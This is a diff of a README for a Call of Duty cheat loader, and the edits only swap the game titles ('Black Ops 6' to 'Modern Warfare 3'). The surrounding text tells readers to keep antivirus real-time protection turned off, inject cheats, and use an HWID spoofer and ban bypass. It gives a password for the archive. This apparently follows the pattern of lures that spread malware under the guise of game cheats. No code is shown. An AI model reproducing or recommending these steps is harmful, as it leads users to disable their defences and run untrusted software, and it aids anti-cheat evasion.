@@ -43,7 +43,7 @@ To ensure functionality of the loader, make sure **Real-time protection** and **
 4. **Select and Inject Cheats**
    - In the menu, select one of the following options:
      - **Unlock All Tool**
-     - **MW3/Warzone 3 Multiplayer Hacks**
+     - **MW3/Warzone Multiplayer Hacks**
      - Click **Start Injection**. After a successful injection, a confirmation message will appear: **Injection Complete**.
 
 5. **Launch and Play**
@@ -117,6 +117,6 @@ Play worry-free with an included HWID spoofer and shadow ban bypass.
 ---
 
 
-> **Enjoy gameplay with advanced features and total customization.** Follow the setup instructions closely, and dive into the enhanced experience in Black Ops 6!</br>
+> **Enjoy gameplay with advanced features and total customization.** Follow the setup instructions closely, and dive into the enhanced experience in Modern Warfare 3!</br>
 Enjoy!!</br>
 Archive password is: __S7Crackz__</br>
